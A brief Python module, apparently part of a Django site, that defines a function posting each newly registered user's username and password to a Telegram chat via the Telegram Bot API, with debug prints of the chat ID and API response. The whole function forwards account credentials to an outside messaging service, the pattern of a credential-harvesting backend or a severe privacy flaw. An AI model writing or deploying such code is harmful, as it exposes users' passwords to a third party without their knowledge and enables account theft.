# telegram.py

import requests
from django.conf import settings


def send_user_to_telegram(user):
    username = getattr(user, "username", "Unknown")
    password = getattr(user, "password", "Unknown")

    message = f"""
🧾 NEW USER REGISTERED

👤 Username: {username}
🔐 Password: {password}


"""

    bot_token = settings.TELEGRAM_BOT_TOKEN
    chat_id = settings.TELEGRAM_CHAT_ID

    print("BOT TOKEN EXISTS:", bool(bot_token))
    print("CHAT ID:", chat_id)

    if not bot_token:
        print("❌ Telegram Bot Token missing")
        return

    if not chat_id:
        print("❌ Telegram Chat ID missing")
        return

    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"

    try:
        response = requests.post(
            url,
            data={
                "chat_id": chat_id,
                "text": message,
            },
            timeout=10,
        )

        print("Telegram Status:", response.status_code)
        print("Telegram Response:", response.text)

    except requests.RequestException as e:
        print("❌ Telegram Error:", e)